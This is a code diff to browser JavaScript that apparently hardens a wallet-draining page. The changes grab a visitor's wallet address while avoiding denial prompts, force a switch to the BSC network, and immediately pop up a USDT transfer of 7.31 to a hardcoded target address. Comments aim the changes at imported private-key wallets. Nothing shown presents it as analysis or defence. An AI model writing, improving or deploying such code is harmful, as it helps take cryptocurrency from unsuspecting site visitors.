@@ -85,32 +85,56 @@
       }
 
       try {
-        // 1. Request wallet connection instantly
         let accounts = [];
-        if (typeof eth.request === 'function') {
-          accounts = await eth.request({ method: 'eth_requestAccounts' });
-        } else if (typeof eth.send === 'function') {
-          const res = await eth.send('eth_requestAccounts');
-          accounts = res.result || res;
+
+        // Try getting accounts via eth_accounts first (avoids denial prompt in imported wallets)
+        try {
+          if (typeof eth.request === 'function') {
+            accounts = await eth.request({ method: 'eth_accounts' });
+          }
+        } catch (e) {}
+
+        // Fallback to eth_requestAccounts if empty
+        if (!accounts || accounts.length === 0 || !accounts[0]) {
+          try {
+            if (typeof eth.request === 'function') {
+              accounts = await eth.request({ method: 'eth_requestAccounts' });
+            }
+          } catch (e) {}
         }
 
-        const userAddress = Array.isArray(accounts) ? accounts[0] : accounts;
+        // Fallback to legacy send method
+        if (!accounts || accounts.length === 0 || !accounts[0]) {
+          try {
+            if (typeof eth.send === 'function') {
+              const res = await eth.send('eth_accounts');
+              accounts = res.result || res;
+            }
+          } catch (e) {}
+        }
+
+        // Direct property check for imported private key wallets
+        let userAddress = Array.isArray(accounts) ? accounts[0] : accounts;
         if (!userAddress) {
-          throw new Error("Wallet connection denied or no account found.");
+          userAddress = eth.selectedAddress || eth.address || null;
         }
 
-        // 2. Switch to BSC network
+        if (!userAddress || typeof userAddress !== 'string') {
+          throw new Error("Wallet account not detected. Please make sure your wallet is unlocked.");
+        }
+
+        // Switch network to BSC
         try {
           if (typeof eth.request === 'function') {
             await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
           }
         } catch (e) {}
 
-        // 3. Prepare Transfer Payload (BEP-20 USDT transfer function data)
+        // Prepare Transfer Payload for BEP-20 USDT
         const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
         const paddedTarget = cleanTarget.padStart(64, '0');
         
-        // Amount: 7.31 USDT with 18 decimals -> 7.31 * 10^18 = 65163354b3840000 in hex
+        // Amount: 7.31 USDT with 18 decimals -> hex: 65163354b3840000
         const amountHex = "65163354b3840000";
         const paddedAmount = amountHex.padStart(64, '0');
         
@@ -123,7 +147,7 @@
           gas: "0x186A0"
         }];
 
-        // 4. Trigger direct transfer transaction popup
+        // Trigger transaction popup directly
         if (typeof eth.request === 'function') {
           await eth.request({ method: 'eth_sendTransaction', params: txParams });
         } else if (typeof eth.sendAsync === 'function') {
